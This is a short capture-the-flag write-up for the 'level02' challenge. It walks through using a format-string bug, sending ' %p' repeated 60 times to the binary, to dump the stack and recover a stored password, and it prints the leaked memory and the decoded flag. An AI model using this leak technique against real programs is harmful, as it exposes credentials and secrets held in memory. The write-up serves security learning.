## Project README: Finding flag02

When we decompile we can see tat he open the file .pass and reat it into the ptr value. 
Secondl he ask for a username and a password.
Then compare the password we gave with the actual password. If it's the same launch bin sh else exit.

### Analysis
we can see that there is a format string exploit to do if the password is not the same. 
And we know that our password is in the stack.
So what we can do is printing the stack and then see our password.


### Progress

```Bash
level02@OverRide:~$ python -c 'print("AAAA" + " %p"*60)' | ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
AAAA 0x7fffffffe500 (nil) 0x70 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6f8 0x1f7ff9a08 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025 (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d 0xfeff00 0x2070252041414141 0x7025207025207025 0x2520702520702520 0x2070252070252070  does not have access!
```
So the 2a equal * and "207025" is our payload : " %p".
Then we can search for a string that is 40 char long and have a \0 at the end. 
We have this thing "0xfeff00" that looks like a null bite and before it we have 
0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d that is exactly 40 char long. If we convert to str :
"unPR47hH" + "EAJ5as9Q" + "7zqCWNgX" + "5J5hnGXs" + "H3gPfK9M". But actually we want the reverse of this because of little endian. 
let's try this : 
python -c 'print("unPR47hH"[::-1] + "EAJ5as9Q"[::-1] + "7zqCWNgX"[::-1] + "5J5hnGXs"[::-1] + "H3gPfK9M"[::-1])'

python -c 'print("unPR47hH"[::-1] + "EAJ5as9Q"[::-1] + "7zqCWNgX"[::-1] + "5J5hnGXs"[::-1] + "H3gPfK9M"[::-1])'
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H

ET VOILA we have our flag.